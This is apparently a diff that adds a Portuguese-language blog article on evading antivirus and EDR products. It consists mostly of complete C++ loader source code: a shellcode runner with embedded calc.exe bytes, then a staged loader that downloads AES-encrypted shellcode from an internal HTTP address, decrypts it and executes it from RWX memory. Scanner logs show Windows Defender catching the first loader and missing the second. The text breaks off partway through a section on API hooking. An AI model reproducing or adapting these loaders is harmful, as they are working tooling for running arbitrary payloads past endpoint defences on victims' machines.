@@ -1,0 +1,333 @@
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
+    body {
+        background-color: black;
+        color: white;
+    }
+
+    * {
+        font-family: 'VT323', monospace;
+    }
+    
+
+    img {
+      max-width: 50%;
+      height: auto;
+      display: block;
+    }
+
+</style>
+
+<h2 id="1-introdu-o">1. Introdução</h2>
+<p>Soluções EDR aka (Endpoint Detection and Response) são uma evolução dos softwares de segurança que conhecemos como antivírus, EDRs modermos usam tecnicas avanças para detectar ameaça, Hookando APIS, isolando o host da internet, analisando comportamento e classificando a detecção por regra de Indicador de Compromisso (IOC) classificadas pelo MITRE ATT&amp;CK</p>
+<p>nesse artigo demonstrarei burlar EDRs usando tecnicas evasivas </p>
+<h2 id="2-analise-tecnica">2. Analise Tecnica</h2>
+<p>em um ataque real é comun o uso de &quot;Loaders&quot; e &quot;Droppers&quot; que carregam o malware principal passando por &#39;estagios&#39;
+esses estagios podem variar dependendo da complexidade do malware algo que conhecemos como Chain ou Cadeia
+isso é nescesario para nosso ataque não seja interrompido por um AV/EDRs rodando em segundo plano </p>
+<p>aqui abaixo está um loader shellcode super simples:</p>
+<pre><code class="lang-cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+  <span class="hljs-comment">// abre o  calc.exe</span>
+unsigned char shellcode[] = {
+  <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x51</span>,
+  <span class="hljs-number">0x41</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x52</span>,
+  <span class="hljs-number">0x60</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x72</span>,
+  <span class="hljs-number">0x50</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc0</span>,
+  <span class="hljs-number">0xac</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x41</span>,
+  <span class="hljs-number">0x01</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x8b</span>,
+  <span class="hljs-number">0x42</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>,
+  <span class="hljs-number">0x85</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x44</span>,
+  <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x41</span>,
+  <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc0</span>,
+  <span class="hljs-number">0xac</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xf1</span>,
+  <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x44</span>,
+  <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x44</span>,
+  <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>,
+  <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x59</span>,
+  <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x41</span>,
+  <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x48</span>,
+  <span class="hljs-number">0xba</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x8d</span>,
+  <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xd5</span>,
+  <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xff</span>,
+  <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xe0</span>,
+  <span class="hljs-number">0x75</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>,
+  <span class="hljs-number">0xda</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x00</span>
+};
+
+int main() {
+    void* exec_mem;
+    DWORD oldProtect;
+    HANDLE hThread;
+
+    exec_mem = VirtualAlloc(<span class="hljs-number">0</span>, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (exec_mem == NULL) {
+        printf(<span class="hljs-string">"Falha ao alocar memória.<span class="hljs-subst">\n</span>"</span>);
+        return <span class="hljs-number">-1</span>;
+    }
+    memcpy(exec_mem, shellcode, sizeof(shellcode));
+    VirtualProtect(exec_mem, sizeof(shellcode), PAGE_EXECUTE_READ, &amp;oldProtect);
+    hThread = CreateThread(NULL, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)exec_mem, NULL, <span class="hljs-number">0</span>, NULL);
+    if (hThread == NULL) {
+        printf(<span class="hljs-string">"Falha ao criar thread.<span class="hljs-subst">\n</span>"</span>);
+        return <span class="hljs-number">-1</span>;
+    }
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+
+    return <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>o codigo aloca memoria no proprio processo, copia o shellcode para essa região
+e define permissão de RWX (Leitura, Escrita e Execução), 
+apos isso inicia uma Thread passando essa região como endereço.</p>
+<p>vamos scannear o binario e ver o AV acha disso:</p>
+<pre><code>C:\Users\mount\Desktop\&gt;avfind.exe -defender -path shit-loader.exe
+2025/03/29 15:13:57 Scanning the file with Windows Defender: shit-loader.exe
+2025/03/29 15:13:57 Threats found in the file. Starting the binary search
+2025/03/29 15:13:57 Isolated detected bytes at offset 0x272F [10031/11776]
+00000000 <span class="hljs-number"> 44 </span>8b<span class="hljs-number"> 40 </span>24<span class="hljs-number"> 49 </span>01 d0<span class="hljs-number"> 66 </span><span class="hljs-number"> 41 </span>8b 0c<span class="hljs-number"> 48 </span>44 8b<span class="hljs-number"> 40 </span>1c  |D.@$I..fA..HD.@.|
+00000010 <span class="hljs-number"> 49 </span>01 d0<span class="hljs-number"> 41 </span>8b<span class="hljs-number"> 04 </span>88<span class="hljs-number"> 48 </span><span class="hljs-number"> 01 </span>d0<span class="hljs-number"> 41 </span>58<span class="hljs-number"> 41 </span>58 5e<span class="hljs-number"> 59 </span> |I..A...H..AXAX^Y|
+
+2025/03/29 15:13:57 Found threat: Trojan:Win64/Meterpreter.E
+2025/03/29 15:13:57 Found threat: Trojan:Win64/Rozena.AMBE!MTB
+</code></pre><p>o Defender acabou de analisar o loader e detectou que essa sequencia de bytes no codigo
+é uma ameaça...</p>
+<p>olhando no IDA pro e procurando por essa sequencia hexadecimal vamos encontrar o nosso shellcode de calculadora</p>
+<p><img src="../../static/calc.png" alt="map"></p>
+<h2 id="obfuscation-web-estagio">Obfuscation + Web Estagio</h2>
+<p>oque mudou?</p>
+<pre><code>-<span class="ruby"> payload com AES
+</span>-<span class="ruby"> Chave de Decriptação
+</span>-<span class="ruby"> Estagio Web</span>
+</code></pre><p>vamos mudar o codigo para que ele interaja com o shellcode baixando da internet e 
+decriptando em tempo de execução, isso vai impedir que o binario tenha uma entropia alta</p>
+<pre><code class="lang-cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span>  </span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span>    </span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;psapi.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winhttp.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;wincrypt.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">"winhttp.lib"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment (lib, <span class="hljs-meta-string">"crypt32.lib"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment (lib, <span class="hljs-meta-string">"advapi32"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> okay(msg, ...) printf(<span class="hljs-meta-string">"[+] "</span> msg , ##__VA_ARGS__)</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> info(msg, ...) printf(<span class="hljs-meta-string">"[*] "</span> msg , ##__VA_ARGS__)</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> warn(msg, ...) printf(<span class="hljs-meta-string">"[-] "</span> msg , ##__VA_ARGS__)</span>
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printMemoryInfo</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* address, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* name)</span> </span>{
+    MEMORY_BASIC_INFORMATION mbi;
+    VirtualQuery(address, &amp;mbi, <span class="hljs-keyword">sizeof</span>(mbi));
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] %s: %p\n"</span>, name, address);
+    info(<span class="hljs-string">"    Base Address: %p\n"</span>, mbi.BaseAddress);
+    info(<span class="hljs-string">"    Allocation Base: %p\n"</span>, mbi.AllocationBase);
+    info(<span class="hljs-string">"    Allocation Protect: 0x%X\n"</span>, mbi.AllocationProtect);
+    info(<span class="hljs-string">"    Region Size: %zu bytes\n"</span>, mbi.RegionSize);
+    info(<span class="hljs-string">"    State: 0x%X (MEM_COMMIT=0x1000, MEM_RESERVE=0x2000)\n"</span>, mbi.State);
+    info(<span class="hljs-string">"    Protect: 0x%X (PAGE_EXECUTE=0x10, PAGE_READWRITE=0x04)\n"</span>, mbi.Protect);
+    info(<span class="hljs-string">"    Type: 0x%X (MEM_PRIVATE=0x20000, MEM_IMAGE=0x1000000)\n\n"</span>, mbi.Type);
+}
+
+<span class="hljs-keyword">const</span> LPCTSTR url = <span class="hljs-string">L"http://192.168.0.10/x"</span>;
+
+
+<span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key[] = { 
+     <span class="hljs-number">0x51</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x8e</span>
+};
+
+
+<span class="hljs-function">BOOL <span class="hljs-title">GetPayloadFromUrl</span><span class="hljs-params">(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize)</span> </span>{
+    BOOL bSTATE = TRUE;
+    HINTERNET hSession = <span class="hljs-literal">NULL</span>, hConnect = <span class="hljs-literal">NULL</span>, hRequest = <span class="hljs-literal">NULL</span>;
+    DWORD dwBytesRead = <span class="hljs-number">0</span>;
+    SIZE_T sSize = <span class="hljs-number">0</span>;
+    PBYTE pBytes = <span class="hljs-literal">NULL</span>, pTmpBytes = <span class="hljs-literal">NULL</span>;
+
+    URL_COMPONENTS urlComp;
+    WCHAR szHostName[<span class="hljs-number">256</span>] = { <span class="hljs-number">0</span> };
+    WCHAR szUrlPath[<span class="hljs-number">256</span>] = { <span class="hljs-number">0</span> };
+
+    ZeroMemory(&amp;urlComp, <span class="hljs-keyword">sizeof</span>(urlComp));
+    urlComp.dwStructSize = <span class="hljs-keyword">sizeof</span>(urlComp);
+    urlComp.lpszHostName = szHostName;
+    urlComp.dwHostNameLength = <span class="hljs-keyword">sizeof</span>(szHostName) / <span class="hljs-keyword">sizeof</span>(szHostName[<span class="hljs-number">0</span>]);
+    urlComp.lpszUrlPath = szUrlPath;
+    urlComp.dwUrlPathLength = <span class="hljs-keyword">sizeof</span>(szUrlPath) / <span class="hljs-keyword">sizeof</span>(szUrlPath[<span class="hljs-number">0</span>]);
+
+    <span class="hljs-keyword">if</span> (!WinHttpCrackUrl(szUrl, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;urlComp)) {
+        bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+    }
+
+    hSession = WinHttpOpen(<span class="hljs-string">L""</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (hSession == <span class="hljs-literal">NULL</span>) {
+        bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+    }
+
+    hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (hConnect == <span class="hljs-literal">NULL</span>) {
+        bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+    }
+
+    hRequest = WinHttpOpenRequest(hConnect, <span class="hljs-string">L"GET"</span>, urlComp.lpszUrlPath, <span class="hljs-literal">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (hRequest == <span class="hljs-literal">NULL</span>) {
+        bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+    }
+
+    <span class="hljs-keyword">if</span> (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, <span class="hljs-number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) {
+        bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+    }
+
+    <span class="hljs-keyword">if</span> (!WinHttpReceiveResponse(hRequest, <span class="hljs-literal">NULL</span>)) {
+        bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+    }
+
+    pTmpBytes = (PBYTE)LocalAlloc(LPTR, <span class="hljs-number">1024</span>);
+    <span class="hljs-keyword">if</span> (pTmpBytes == <span class="hljs-literal">NULL</span>) {
+        bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+    }
+
+    <span class="hljs-keyword">while</span> (TRUE) {
+        <span class="hljs-keyword">if</span> (!WinHttpReadData(hRequest, pTmpBytes, <span class="hljs-number">1024</span>, &amp;dwBytesRead)) {
+            bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+        }
+
+        <span class="hljs-keyword">if</span> (dwBytesRead == <span class="hljs-number">0</span>) {
+            <span class="hljs-keyword">break</span>;
+        }
+
+        sSize += dwBytesRead;
+
+        <span class="hljs-keyword">if</span> (pBytes == <span class="hljs-literal">NULL</span>)
+            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
+        <span class="hljs-keyword">else</span>
+            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+
+        <span class="hljs-keyword">if</span> (pBytes == <span class="hljs-literal">NULL</span>) {
+            bSTATE = FALSE; <span class="hljs-keyword">goto</span> _EndOfFunction;
+        }
+
+        <span class="hljs-built_in">memcpy</span>((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+        <span class="hljs-built_in">memset</span>(pTmpBytes, <span class="hljs-string">'\0'</span>, dwBytesRead);
+    }
+
+    *pPayloadBytes = pBytes;
+    *sPayloadSize = sSize;
+
+_EndOfFunction:
+    <span class="hljs-keyword">if</span> (hSession) WinHttpCloseHandle(hSession);
+    <span class="hljs-keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);
+    <span class="hljs-keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);
+    <span class="hljs-keyword">if</span> (pTmpBytes) LocalFree(pTmpBytes);
+    <span class="hljs-keyword">return</span> bSTATE;
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">AESDecrypt</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* payload, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> payload_len, <span class="hljs-keyword">char</span>* key, SIZE_T keylen)</span> </span>{
+    HCRYPTPROV hProv;
+    HCRYPTHASH hHash;
+    HCRYPTKEY hKey;
+
+    <span class="hljs-keyword">if</span> (!CryptAcquireContextW(&amp;hProv, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    <span class="hljs-keyword">if</span> (!CryptCreateHash(hProv, CALG_SHA_256, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;hHash)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    <span class="hljs-keyword">if</span> (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, <span class="hljs-number">0</span>)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    <span class="hljs-keyword">if</span> (!CryptDeriveKey(hProv, CALG_AES_256, hHash, <span class="hljs-number">0</span>, &amp;hKey)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    <span class="hljs-keyword">if</span> (!CryptDecrypt(hKey, (HCRYPTHASH)<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, payload, &amp;payload_len)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    CryptReleaseContext(hProv, <span class="hljs-number">0</span>);
+    CryptDestroyHash(hHash);
+    CryptDestroyKey(hKey);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+    PBYTE EncShellcode = <span class="hljs-literal">NULL</span>;
+    SIZE_T fileSize = <span class="hljs-number">0</span>;
+    PVOID exec_mem = <span class="hljs-literal">NULL</span>;
+    HANDLE hThread = <span class="hljs-literal">NULL</span>;
+    NTSTATUS status;
+    DWORD oldProtect = <span class="hljs-number">0</span>;
+    <span class="hljs-comment">// 1. Baixar o shellcode</span>
+    <span class="hljs-keyword">if</span> (!GetPayloadFromUrl(url, &amp;EncShellcode, &amp;fileSize)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    okay(<span class="hljs-string">"Encriptado"</span>, EncShellcode, fileSize);
+    okay(<span class="hljs-string">"Shellcode criptografado carregado da URL.\n"</span>);
+    printMemoryInfo(EncShellcode, <span class="hljs-string">"EncShellcode"</span>);
+    <span class="hljs-comment">// 2. Descriptografar o shellcode</span>
+    AESDecrypt((<span class="hljs-keyword">char</span>*)EncShellcode, fileSize, key, <span class="hljs-keyword">sizeof</span>(key));
+
+    exec_mem = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(EncShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    <span class="hljs-keyword">if</span> (exec_mem == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Falha ao alocar memória.\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    <span class="hljs-built_in">memcpy</span>(exec_mem, EncShellcode, fileSize);
+    VirtualProtect(exec_mem, fileSize, PAGE_EXECUTE_READ, &amp;oldProtect);
+    hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)exec_mem, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Falha ao criar thread.\n"</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+
+}
+</code></pre>
+<pre><code>C:\Users\mount\Desktop\maldev\avidentifier&gt;avfind.exe -defender -path good-loader.exe
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">29</span> <span class="hljs-number">16</span>:<span class="hljs-number">09</span>:<span class="hljs-number">30</span> Scanning <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">with</span> Windows Defender: good-loader.exe
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">29</span> <span class="hljs-number">16</span>:<span class="hljs-number">09</span>:<span class="hljs-number">30</span> Failed <span class="hljs-built_in">to</span> scan <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">with</span> Windows Defender: NoThreatFound
+</code></pre><p>Eeee bingo! conseguimos burlar o AV/Defender porem ainda será detectavel em um EDR isso acontece 
+pelo uso das funções VirtualAlloc, VirtualProtect e CreateThread que são muito usados em malware
+e por isso são interceptadas por ele usando uma tecnica chamada &quot;API HOOKING&quot;</p>
+<p><img src="../../static/imports.png" alt="map"></p>
+<h2 id="api-hooking">API HOOKING</h2>
+<p>Um fluxo normal de chamada de API no windows funciona da seguinte forma:</p>
+<p>CreateRemoteThread() ---&gt; NtCreateThreadEx() ---&gt; SYSCALL</p>
+<p>a função CreateRemoteThread chama a NtCreateThreadEx hospedada na ntdll.dll que por fim chama a syscall
+Muitos EDRs monitoram chamadas de NTAPIS usando hooks de trampolim para verificar quando uma função é chamada por 
+um programa e quais argumentos ele passa</p>
+<pre><code>C<span class="hljs-function"><span class="hljs-title">reateRemoteThread</span>() ---&gt;</span> N<span class="hljs-function"><span class="hljs-title">tCreateThreadEx</span>() ----&gt;</span> SYSCALL 
